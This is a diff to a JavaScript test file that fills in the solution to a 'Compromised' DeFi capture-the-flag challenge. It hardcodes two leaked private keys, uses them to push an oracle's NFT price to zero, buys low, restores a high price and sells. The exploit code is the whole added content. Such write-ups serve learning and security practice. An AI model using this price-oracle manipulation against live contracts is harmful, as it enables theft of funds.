@@ -52,7 +52,32 @@ describe('Compromised challenge', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        /** There are the two private keys in Bytes.
+         * Convert them
+         * Change the price
+         * Buy low
+         * Sell high
+         */
+
+        const provider = ethers.provider;
+        const firstPrivKey = '0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9';
+        const secondPrivKey = 
+        "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48";
+        const first = new ethers.Wallet(firstPrivKey, provider);
+        const second = new ethers.Wallet(secondPrivKey, provider);
+        const wrongPrice = ethers.utils.parseEther("0");
+        const priceToBuy = ethers.utils.parseEther("0.01");
+        const correctPrice = ethers.utils.parseEther("999");
+        await oracle.connect(first).postPrice("DVNFT", wrongPrice);
+        await oracle.connect(second).postPrice("DVNFT", wrongPrice);
+        
+        let receipt = await(await exchange.connect(player).buyOne({value: priceToBuy})).wait();
+        const tokenId = receipt.events[1].args.tokenId;
+
+        await oracle.connect(first).postPrice("DVNFT", correctPrice);
+        await oracle.connect(second).postPrice("DVNFT", correctPrice);
+        await nftToken.connect(player).approve(exchange.address, tokenId);
+        await exchange.connect(player).sellOne(tokenId);
     });
 
     after(async function () {
